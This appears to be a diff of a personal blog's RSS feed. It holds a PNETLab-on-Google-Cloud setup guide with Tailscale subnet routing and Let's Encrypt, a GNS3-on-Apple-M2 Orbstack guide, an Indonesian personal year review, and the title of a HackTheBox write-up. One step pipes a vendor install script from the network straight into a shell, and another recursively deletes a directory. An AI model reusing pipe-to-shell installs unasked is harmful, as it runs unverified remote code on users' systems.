+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# rm -rf /opt/unetlab/labs/
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# ln -s /mnt/unetlab/addons/ /opt/unetlab/
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# ln -s /mnt/unetlab/labs/ /opt/unetlab/
+</span></span></code></pre></div><p>Change ownership of the new labs directory to ensure PNETLab&rsquo;s services can access it back.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# chown -R www-data:www-data /mnt/unetlab/labs/
+</span></span></code></pre></div><h3 id="configure-tailscale-vpn">Configure Tailscale VPN</h3>
+<p>We will register the server as a Tailscale node, but before that, make sure you already generated an auth key in the Tailscale <a href="https://login.tailscale.com/admin/settings/keys">admin&rsquo;s console</a>.</p>
+<p>First, install Tailscale by executing the install script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# curl -fsSL https://tailscale.com/install.sh <span class="p">|</span> sh 
+</span></span></code></pre></div><p>We will configure the server as a <a href="https://tailscale.com/kb/1019/subnets">subnet router.</a> This will allow direct access to the PNETLab QEMU/Docker appliances from your local network via the Tailscale network. Yes, that&rsquo;s correct! We simply turning the server into a <strong>router</strong>.</p>
+<p>To achieve that, we first need to enable IP forwarding on the server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# <span class="nb">echo</span> <span class="s1">&#39;net.ipv4.ip_forward = 1&#39;</span> <span class="p">|</span> sudo tee -a /etc/sysctl.d/99-tailscale.conf
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# <span class="nb">echo</span> <span class="s1">&#39;net.ipv6.conf.all.forwarding = 1&#39;</span> <span class="p">|</span> sudo tee -a /etc/sysctl.d/99-tailscale.conf
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# sudo sysctl -p /etc/sysctl.d/99-tailscale.conf
+</span></span></code></pre></div><p>Next, to register the server as a node in your Tailscale network and  configure it as a subnet router, run the following command, replacing <code>tskey-auth-XXXXX</code> with your actual auth key and <code>10.0.10.0/24</code> with your designated local network on the PNETLAB server:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# tailscale up --auth-key<span class="o">=</span>tskey-auth-XXXXX  --advertise-route<span class="o">=</span>10.0.10.0/24
+</span></span></code></pre></div><blockquote>
+<p>In my case, <code>10.0.10.0/24</code> is my docker network, therefore I can communicate with all the docker appliances in this network locally via the pnetlab server that act as a gateway.</p>
+</blockquote>
+<p>Revisit your Tailscale&rsquo;s admin console. You should see a <code>Subnets</code> label on the pnetlab node.</p>
+<img src="./imgs/image-20250326110623945.png" alt="image-20250326110623945" style="zoom:50%;" />
+<p>Open the node settings, select &ldquo;<strong>edit route settings&hellip;</strong>&rdquo; and tick your network there.</p>
+<img src="./imgs/image-20250326100421964.png" alt="image-20250326100421964" style="zoom: 50%;" />
+<p>Save and exit.</p>
+<h3 id="update-grub-config">Update Grub Config</h3>
+<p>Remove the default grub config.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# rm /etc/default/grub.d/50-cloudimg-settings.cfg
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# update-grub
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# reboot
+</span></span></code></pre></div><h3 id="update-version-optional">Update Version (Optional)</h3>
+<p>After the installation completed, we can directly upgrade PNETLab to the latest version. Since it&rsquo;s an optional, I will just put the official guide link on how to upgrade the lab version: <a href="https://pnetlab.com/pages/releases">go here</a>.</p>
+<h2 id="configure-domain-name">Configure Domain Name</h2>
+<p>I&rsquo;d like to get rid of the self-signed warning and use a custom domain name when accessing PNETLab.  To do so, we will obtain a LetsEncrypt&rsquo;s certificate to replace the self-signed one and then configure a new DNS record: <code>pnetlab.yourdomain.com</code>. The DNS will be pointing to your Tailscale node&rsquo;s IP.</p>
+<p>For this step, I will assume that you already own a domain.</p>
+<h3 id="use-letsencrypt-ssl-on-pnetlab">Use LetsEncrypt SSL on PNETLab</h3>
+<p>On the pnetlab server, install <code>certbot</code> and prepare the work folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# sudo apt install -y certbot
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkdir letsencrypt/work letsencrypt/config letsencrypt/logs
+</span></span></code></pre></div><p>Run the following command to obtain a Let&rsquo;s Encrypt certificate and  complete the ACME DNS challenge with your DNS provider/hosting (NameCheap, Hostinger, etc).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# certbot certonly --agree-tos --email admin@yourdomain.com --manual --preferred-challenges<span class="o">=</span>dns -d <span class="se">\*</span>.yourdomain.com --config-dir ./letsencrypt/config --work-dir ./letsencrypt/work --logs-dir ./letsencrypt/logs
+</span></span></code></pre></div><p>The certificate should be available at <code>./letsencrypt/config/live/yourdomain.com</code></p>
+<p>Next, edit <code>/etc/apache2/sites-available/pnetlabs.conf</code> and change these values with your certificate path.</p>
+<pre tabindex="0"><code>SSLCertificateFile   /path/to/your/cert/cert1.pem
+SSLCertificateKeyFile /path/to/your/certkey/privkey1.pem
+</code></pre><p>Restart the apache services</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# systemctl restart apache2
+</span></span></code></pre></div><h3 id="create-dns-a-record">Create DNS A record</h3>
+<p>Go to your DNS hosting provider and add a new records with the following data:</p>
+<ul>
+<li>Type: <code>A</code></li>
+<li>Hostname/Domain Name: <code>pnetlab.yourdomain.com</code></li>
+<li>IPv4: <code>pnetlab-tailscale-ip</code></li>
+</ul>
+<p>Here&rsquo;s an example of using Cloudflare DNS management for your reference.</p>
+<img src="./imgs/image-20250326102815535.png" alt="image-20250326102815535" style="zoom: 33%;" />
+<blockquote>
+<p><code>100.126.1.2</code> is the tailscale node IP of my pnetlab server.</p>
+</blockquote>
+<p>Verify if your domain is mapped correctly using the <code>dig</code> command or <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ dig pnetlab.gcp.fahmifj.space                         
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
+</span></span><span class="line"><span class="cl"><span class="p">;</span>pnetlab.fahmifj.space.	IN	A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
+</span></span><span class="line"><span class="cl">pnetlab.fahmifj.space. 300	IN	A	100.126.1.2
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><p>Once you done and get connected to Tailscale network, you should be able to access PNETLab at <code>pnetlab.yourdomain.com</code>.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>We&rsquo;ve completed all the necessary steps to deploy a PNETLab server on Google Cloud. With this setup, we can do our networking stuff in the lab safely without exposing it to the internet. But, of course it doesn&rsquo;t stop here, you have to start importing the appliances into the lab.</p>
+<p>That&rsquo;s all, see you in the next post!</p>
+<h2 id="troubleshoot">Troubleshoot</h2>
+<h3 id="cannot-install-packages">Cannot install packages</h3>
+<p>Try disable/comment this whole url line from the repository.</p>
+<pre tabindex="0"><code>#deb [trusted=yes] http://i-share.top/repo ./
+#deb [trusted=yes] http://repo.pnetlab.com ./
+</code></pre><h3 id="cloud-appliance-dhcp-not-working">Cloud Appliance: DHCP not working</h3>
+<p>Verify <code>udhcpd</code> service is running and enabled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ service udhcpd status
+</span></span><span class="line"><span class="cl">$ cat /etc/default/udhcpd <span class="p">|</span> grep ENABLED
+</span></span></code></pre></div><p>Restart and update it if necessary and see if it&rsquo;s working.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Running GNS3 server on Apple M2 with Orbstack</title>
+      <link>https://fahmifj.github.io/articles/running-gns3-on-apple-m2-orbstack/</link>
+      <pubDate>Wed, 29 Jan 2025 20:36:34 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/articles/running-gns3-on-apple-m2-orbstack/</guid>
+      <description>Lately, I&amp;rsquo;ve been switching from my Windows laptop to MacBook M2 for daily driver. It was smooth until I needed to migrate my virtual networking lab that relies on GNS3. It&amp;rsquo;s for my preparation before taking another Mikrotik&amp;rsquo;s certification. I was initially hesitant about whether I could run GNS3 on my M2 machine. After some research, I discovered that the GNS3 client is indeed available for macOS. To host the GNS3 server, I learned that I could set it up from scratch on a Linux machine using Orbstack.</description>
+      <content:encoded><![CDATA[<p>Lately, I&rsquo;ve been switching from my Windows laptop to MacBook M2 for daily driver. It was smooth until I needed to migrate my virtual networking lab that relies on GNS3. It&rsquo;s for my preparation before taking another Mikrotik&rsquo;s certification. I was initially hesitant about whether I could run GNS3 on my M2 machine. After some <a href="https://www.gns3.com/community/featured/gns3-on-apple-silicon">research</a>, I discovered that the GNS3 client is indeed available for macOS. To host the GNS3 server, I learned that I could set it up from scratch on a Linux machine using Orbstack.</p>
+<h4 id="goals">Goals</h4>
+<ul>
+<li>Get GNS3 server running on M2 Apple Silicon CPU.</li>
+<li>Get GNS3 appliance installed on the GNS3 server.</li>
+</ul>
+<h4 id="prerequisites">Prerequisites</h4>
+<ul>
+<li><a href="https://orbstack.dev/">Orbstack</a> installed.</li>
+<li><a href="https://github.com/gns3/gns3-gui/releases">GNS3 GUI/client</a> installed.</li>
+</ul>
+<h4 id="diagram">Diagram</h4>
+<p>I drew a diagram to give you an overview of what we are going to do here.</p>
+<img src="./imgs/image-20250129212031966.png" alt="image-20250129212031966" style="zoom: 50%;" />
+<h2 id="on-mac">On Mac</h2>
+<h3 id="deploy-a-linux-machine">Deploy A Linux Machine</h3>
+<p>With Orbstack, create a new Linux machine with the latest Ubuntu distro.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ orb create --arch amd64 ubuntu gns3-host
+</span></span></code></pre></div><p>Then verify the machine is running.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ orb list
+</span></span><span class="line"><span class="cl">NAME       STATE    DISTRO  VERSION   ARCH
+</span></span><span class="line"><span class="cl">----       -----    ------  -------   ----
+</span></span><span class="line"><span class="cl">gns3-host  running  ubuntu  oracular  amd64
+</span></span></code></pre></div><p>The Linux machine we just installed will act as the GNS3 server host.</p>
+<h3 id="resources-allocation">Resources Allocation</h3>
+<p>We can allocate CPU and memory resources to limit how much Orbstack machine can use with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#Show current configuration</span>
+</span></span><span class="line"><span class="cl">$ orb config show
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Set maximum CPU cores for Orbstack to 4 cores</span>
+</span></span><span class="line"><span class="cl">$ orb config <span class="nb">set</span> cpu <span class="m">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Set maximum memory for Orbstack to 8 GB</span>
+</span></span><span class="line"><span class="cl">$ orb config <span class="nb">set</span> memory_mib <span class="m">8000</span>
+</span></span></code></pre></div><h2 id="on-the-linux-machine">On the Linux machine</h2>
+<h3 id="hosting-gns3-server">Hosting GNS3 Server</h3>
+<p>From Mac, login into the machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ orb -m gns3-host -u root
+</span></span></code></pre></div><p>Add the GNS3 repository and install some necessary tools.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@gns3 $ sudo add-apt-repository ppa:gns3/ppa
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo apt update
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo apt install software-properties-common
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo apt install qemu-system-x86
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo apt install telnet
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo apt install gns3-server
+</span></span></code></pre></div><p>In the middle way, select &ldquo;yes&rdquo; when you prompted with something like this.</p>
+<img src="./imgs/image-20250129214423431.png" alt="image-20250129214423431" style="zoom:50%;" />
+<p>If you missed the prompt, run the following.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#Add ubridge group to the gns3 user</span>
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo usermod -aG ubridge gns3
+</span></span></code></pre></div><p>Verify the GNS3 server installation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@gns3 $ systemctl status gns3-server
+</span></span></code></pre></div><p>Or by visiting &ldquo;http://localhost:3080&rdquo;.</p>
+<h3 id="change-working-directory">Change Working Directory</h3>
+<p>This is optional. I would like to move the default working directory of GNS3 at <code>/var/lib/gns3-server/GNS3/</code> to <code>/opt/gns3/</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#Create new dir config</span>
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo mkdir /opt/gns3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Copy old dir config to new dir config</span>
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo cp -r /var/lib/gns3-server/GNS3/* /opt/gns3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Change ownership </span>
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo chown -R gns3:gns3 /opt/gns3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Change default home directory</span>
+</span></span><span class="line"><span class="cl">user@gns3 $ sudo usermod -d /opt/gns3 gns3
+</span></span></code></pre></div><h3 id="configure-gns3-server">Configure GNS3 Server</h3>
+<p>Since KVM is not supported inside the orbstack machine, we need to make some adjustments for GNS3 server config. Edit the config at <code>/opt/gns3/.config/GNS3/2.2/gns3_server.conf</code> as follows:</p>
+<pre tabindex="0"><code>[Server]
+host = 0.0.0.0
+port = 3080
+images_path = /opt/gns3/images
+appliances_path = /opt/gns3/appliances
+configs_path = /opt/gns3/configs
+projects_path = /opt/gns3/projects
+symbols_path = /opt/gns3/symbols
+
+report_errors = True
+
+; First console port of the range allocated to devices
+console_start_port_range = 5000
+; Last console port of the range allocated to devices
+console_end_port_range = 10000
+
+; First VNC console port of the range allocated to devices.
+; The value MUST BE &gt;= 5900 and &lt;= 65535
+vnc_console_start_port_range = 5900
+; Last VNC console port of the range allocated to devices
+; The value MUST BE &gt;= 5900 and &lt;= 65535
+vnc_console_end_port_range = 10000
+
+; First port of the range allocated for inter-device communication. Two ports are allocated per link.
+udp_start_port_range = 10000
+; Last port of the range allocated for inter-device communication. Two ports are allocated per link
+udp_end_port_range = 20000
+
+; Only allow these interfaces to be used by GNS3, for the Cloud node for example (Linux/OSX only)
+; Do not forget to allow virbr0 in order for the NAT node to work
+allowed_interfaces = virbr0
+
+; Enable the built-in templates
+enable_builtin_templates = True
+
+; check if hardware virtualization is used by other emulators (KVM, VMware or VirtualBox)
+hardware_virtualization_check = False
+
+[Dynamips]
+allocate_aux_console_ports = False
+mmap_support = True
+sparse_memory_support = True
+ghost_ios_support = True
+
+[IOU]
+iourc_path = /opt/gns3/iourc
+license_check = True
+
+[Qemu]
+enable_kvm = False
+require_kvm = False
+enable_hardware_acceleration = False
+require_hardware_acceleration = False
+</code></pre><p>If the config directory don&rsquo;t exist do the following (inside the orbstack VM):</p>
+<ol>
+<li>Run <code>systemctl stop gns3-server</code>.</li>
+<li>Run <code>gns3server</code> manually for a minute and stop it.</li>
+<li>Start again with <code>systemctl start gns3-server</code>.</li>
+<li>Look up again under <code>/var/lib/gns3-server/GNS3/.config</code> or <code>/opt/gns3/.config</code> if you follow the step 3.</li>
+</ol>
+<p>We&rsquo;re done with the server here.</p>
+<h2 id="setting-up-gns3-client">Setting Up GNS3 Client</h2>
+<h3 id="gns3-client">GNS3 Client</h3>
+<p>GNS3 Client should detect the server automatically, if not, try open <strong>the GNS3 Client &gt; Settings &gt; Server</strong> and point the GNS3 server to the Linux machine.</p>
+<p><div class="img-container"><img src="./imgs/image-20250129223723294.png" alt="image-20250129223723294"  /></div>
+</p>
+<p>Verify the connection.</p>
+<h3 id="appliances-installation">Appliances Installation</h3>
+<p>The network appliances now can be installed normally.</p>
+<h2 id="the-results">The results</h2>
+<h3 id="testing-initial-setup">Testing Initial Setup</h3>
+<p>So far, excluding the ATM and Frame relay switches, I&rsquo;ve tested the basic appliances and everything works as it should except for the Cloud appliance.</p>
+<img src="./imgs/image-20250129230112734.png" alt="image-20250129230112734" style="zoom:50%;" />
+<h3 id="performances">Performances</h3>
+<p>I allocated 4 CPUs and 4 GB of memory to Orbstack for the initial lab setup. Despite adding two more routers, everything runs smoothly and fast, with no choppy performance at all.</p>
+<img src="./imgs/image-20250130222443482.png" alt="image-20250130222443482" style="zoom:50%;" />
+<h2 id="conclusion">Conclusion</h2>
+<p>At this point, GNS3 hosted within Orbstack Linux machine ran seamlessly on my M2 Mac. This should be enough for creating or simulating networking projects. However, I still wanted my network appliances could communicate with the LAN on my Mac, which I will dig into it in the next section.</p>
+<h2 id="dig-into-network-limitation">Dig into Network Limitation</h2>
+<p><strong>Accessing GNS3 Appliances from Mac LAN</strong></p>
+<p>According to <a href="https://docs.orbstack.dev/machines/network">the documentation</a>, all Orbstack Linux machines are connected to the same network bridge with a fixed IPv4 address of <code>198.19.249.0/24</code>. On Mac, this network bridge displayed as <code>bridge100</code> and the Linux machines connected to that bridge via its <code>eth0</code>.</p>
+<p>My goal is, let&rsquo;s say Winbox on Mac, will able to communicate with the GNS3 Mikrotik through the Cloud appliance via <code>eth0</code> of GNS3 server. Here&rsquo;s the diagram.</p>
+<img src="./imgs/image-20250201125922492.png" alt="image-20250201125922492" style="zoom: 33%;" />
+<p>Unfortunately, the Cloud appliance here did not list the <code>eth0</code> interface.</p>
+<img src="./imgs/image-20250130225807891.png" alt="image-20250130225807891" style="zoom: 25%;" />
+<p>In the image above,  <code>virbr0</code>  and <code>gns3tap0-0</code> are the interfaces that GNS3 use for the NAT appliances (<a href="https://gns3.com/how-the-nat-node-in-gns3-works">source</a>). When I ran the script that populates the interfaces on the GNS3 server manually, the output states that <code>eth0</code> cannot be used on this server.</p>
+<img src="./imgs/image-20250131005043784.png" alt="image-20250131005043784" style="zoom:50%;" />
+<p>After taking another look at the code, I figured out where the issue was. You guys probably have noticed it. 😂</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">sys</span><span class="o">.</span><span class="n">platform</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;win&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">allowed_interfaces</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">get_section_config</span><span class="p">(</span><span class="s2">&#34;Server&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;allowed_interfaces&#34;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">allowed_interfaces</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">allowed_interfaces</span> <span class="o">=</span> <span class="n">allowed_interfaces</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">net_if_addrs</span> <span class="o">=</span> <span class="n">psutil</span><span class="o">.</span><span class="n">net_if_addrs</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">interface</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">net_if_addrs</span><span class="o">.</span><span class="n">keys</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">allowed_interfaces</span> <span class="ow">and</span> <span class="n">interface</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_interfaces</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interface</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;gns3tap&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;Interface &#39;</span><span class="si">{}</span><span class="s2">&#39; is not allowed to be used on this server&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">interface</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></div><p>Yeah, it&rsquo;s on the step 3, about the server config! I just need to add the interface I want to be allowed there. Haha.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="c1">; Only allow these interfaces to be used by GNS3, for the Cloud node for example (Linux/OSX only)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; Do not forget to allow virbr0 in order for the NAT node to work</span>
+</span></span><span class="line"><span class="cl"><span class="na">allowed_interfaces</span> <span class="o">=</span> <span class="s">virbr0,eth0 </span>
+</span></span><span class="line"><span class="cl"><span class="c1">; ^ I added eth0</span>
+</span></span></code></pre></div><p>After that, pinging from Mac to GNS3 Mikrotik is reachable, but it&rsquo;s not over yet!</p>
+<img src="./imgs/image-20250201140538579.png" alt="image-20250201140538579" style="zoom: 33%;" />
+<p>I&rsquo;m still unable to access the services like for example Mikrotik Winbox on port 8291 or WebFig on port 80. It results the same with the GNS3 server.</p>
+<img src="./imgs/image-20250202135153641.png" alt="image-20250202135153641" style="zoom: 33%;" />
+<p>Inspecting the traffic with Wireshark, I saw that no TCP handshake was performed. I gave up! Orbstack network implementation is beyond my understanding, so I don&rsquo;t know what exactly it does under the hood.</p>
+<img src="./imgs/image-20250201163513432.png" alt="image-20250201163513432" style="zoom: 33%;" />
+<p>It seems I have to wait for Orbstack to fully support bridged networking. 	In the meantime, I will take a look for other options like UTM, or even move to PNET Lab. Personally, I liked Orbstack more, it almost similar to WSL but on Mac.</p>
+<p>That&rsquo;s all, see you in the next post!</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>2024 So Far</title>
+      <link>https://fahmifj.github.io/stories/2024-so-far/</link>
+      <pubDate>Thu, 28 Nov 2024 14:32:39 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/stories/2024-so-far/</guid>
+      <description>Am I in the right path?</description>
+      <content:encoded><![CDATA[<p>Halo semua!</p>
+<p>Kali ini, gw mau berbagi sedikit cerita tentang kehidupan gw sepanjang tahun 2024, yang kurang dari satu bulan lagi sudah mau habis masanya.</p>
+<p>Rutinitas sehari-hari gw hampir bikin tahun ini, dan bahkan tahun sebelumnya, itu sama sekali ngga terasa. Sebagai satu makhluk yang terikat dengan waktu, gw pun mulai sedikit cemas ketika rasa dari “waktu” itu sendiri hilang. Kecemasan ini terus menghantui sewaktu gw <del>ingat umur</del> mulai melihat kembali ke rencana hidup gw, yang agaknya sudah sedikit melenceng dari target.</p>
+<h2 id="karier">Karier</h2>
+<p>Semenjak tahun lalu, kerjaan benar-benar mendominasi hampir seluruh aktivitas harian gw. Peran gw bisa dibilang sebagai “Palugada”. Dengan peran ini, gw jadi punya banyak skill set luas dan mudah beradaptasi dengan berbagai situasi. Tapi di sisi lain, kedinamisan tersebut akan jadi single point of failure ketika gw dalam keadaan absen.</p>
+<p>Tanggung jawab gw jadi kurang berfokus, rasanya seperti bola yang bergulir kesana-kemari, sehingga gw merasa waktu untuk eksplorasi hal baru jadi terbatas. Hal inilah yang mau gw hindari.</p>
+<p>Saat itu gw merasa stagnan dan niatan untuk memulai sesuatu yang baru pun muncul. Tentunya di tempat baru. Yap, akhirnya gw sampai pada keputusan besar untuk mengundurkan diri sejak Oktober lalu.</p>
+<p>Sebagai persiapan, gw mulai ambil beberapa pekerjaan tambahan di luar pekerjaan utama gw. Tentunya hal ini gw lakukan setelah jam kerja dan saat akhir pekan. <em>Workaholic</em> sekali, bukan? Tapi buat gw, ini bukan cuma soal nambah penghasilan, melainkan juga memperluas jaringan dan membuka peluang untuk berkembang lebih jauh.</p>
+<p>Jadi, di penghujung tahun ini, gw benar-benar merenungkan kembali tentang kelanjutan karier gw.</p>
+<h2 id="self-development">Self-development</h2>
+<p>Meskipun gw telah terlibat cukup banyak di proyek jaringan dan server dengan tingkat kesulitan menengah, tapi sampai saat ini gw belum memiliki satu pun sertifikasi profesional di bidang tersebut. Untuk memasarkan skill ke klien, gw hanya mengandalkan testimoni dari kolega dan klien sebelumnya—semacam strategi mulut ke mulut.</p>
+<p>Kedua bidang yang gw tekuni itu erat kaitannya dengan privasi dan keamanan, membagikan hasil pekerjaan gw sebagai portofolio pun nggak bisa sembarangan juga sih. Disini gw pikir sertifikasi profesional akan sangat membantu meningkatkan kredibilitas gw, apalagi jika mau menjajaki peluang bekerja <em>overseas</em> secara <em>remote</em>.</p>
+<p>Jadi, tahun depan, gw mulai memprioritaskan diri untuk mendapatkan sertifikasi-sertifikasi yang revelan dengan dua bidang tadi.</p>
+<h2 id="habits">Habits</h2>
+<p>Menulis, khususnya di blog ini, adalah cara gw menumpahkan pikiran yang kusut agar menjadi lebih tertata dan runut. Namun, belakang ini, kebiasaan menulis gw menurun. Padahal, menulis kembali ada dalam rencana gw sejak tahun 2022 lalu. Minimnya aktivitas ini membuat gw merasa kehilangan kesempatan untuk menata sejenak pikiran gw.</p>
+<p>Hal inilah yang juga menambah rasa gak &ldquo;nyaman&rdquo;, sebab berkurangnya kebiasaan menulis ini bukanlah sesuatu yang baik untuk gw.</p>
+<h2 id="systems-env">Systems Env</h2>
+<p>Di tahun ini, gw memulai migrasi penuh dari laptop berbasis Windows ke MacOS dengan arsitektur ARM. Impresi pertama gw adalah takjub dengan ketahanan baterainya. Namun, secara produktivitas, terutama virtualisasi, gw masih merasa Windows tetap unggul dengan fitur WSL-nya. Sampai saat ini gw masih membiasakan diri dengan MacOS, jadi mungkin alasan kurang produktif tadi hanya gw dengan skill issuenya.</p>
+<h2 id="gaming">Gaming</h2>
+<p>Sejak Juli lalu, gw main sebuah game mobile, yaitu <em>Whiteout Survival</em> (WOS). Game ini genrenya strategi dan perang. Tapi hal yang buat gw makin tertarik adalah <em>state</em> (sebutan untuk server) tempat karakter gw dibuat ada di <a href="https://outof.games/realms/whiteoutsurvival/guides/405-server-age-and-timeline-in-whiteout-survival/">fase awal</a>. Artinya, game ini punya <a href="https://gamedesignskills.com/game-design/game-progression/">system progression</a>! Singkatnya, setiap <em>state</em> di game ini bisa memiliki fase/progress yang berbeda.</p>
+<h2 id="books">Books</h2>
+<p>Ada beberapa buku yang sebenarnya gw beli dari tahun 2023, tapi belum ada yang gw baca sampai tuntas nih. Hehe. Dua diantaranya adalah berikut:</p>
+<ul>
+<li><a href="https://shopee.co.id/The-Travelling-Cat-Chronicles-9780857524195-i.164713374.7353408695?sp_atk=cab894d3-6b92-4ee5-be25-8e4f9933df04&amp;xptdk=cab894d3-6b92-4ee5-be25-8e4f9933df04">The Traveling Cat Chronicles</a></li>
+<li><a href="https://shopee.co.id/Gramedia-Pustaka-Utama-Hello-Habits-Panduan-Sosok-Minimalis-untuk-Kehidupan-yang-Lebih-Baik-i.346566928.8675223346?sp_atk=f4a97960-8038-4bd1-91f2-2a8e3d09f19b&amp;xptdk=f4a97960-8038-4bd1-91f2-2a8e3d09f19b">hello, habits</a></li>
+</ul>
+<p>Semoga gw bisa menyelesaikannya salah satu buku diatas sebelum tahun baru.</p>
+<h2 id="support-system">Support System?</h2>
+<p>Last, untuk hal ini, I think I&rsquo;ve I found one dan untuk saat ini mau diem-diem aja dulu. Hehe.</p>
+<h2 id="closing">Closing</h2>
+<p>Tulisan ini harapannya menjadi langkah awal dan usaha untuk kembali ke tujuan dan target awal gw. Tercapai atau tidaknya, maka itu masalah lain. Baiklah, ceritanya gw tutup sampai disini.</p>
+<p>I hope you all have a great journey this year. Sampai nanti!</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Forge</title>
+      <link>https://fahmifj.github.io/hackthebox/forge/</link>
+      <pubDate>Sat, 15 Oct 2022 21:57:48 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/forge/</guid>
+      <description>Bypass SSRF filters using domain redirection and abusing Python PDB</description>
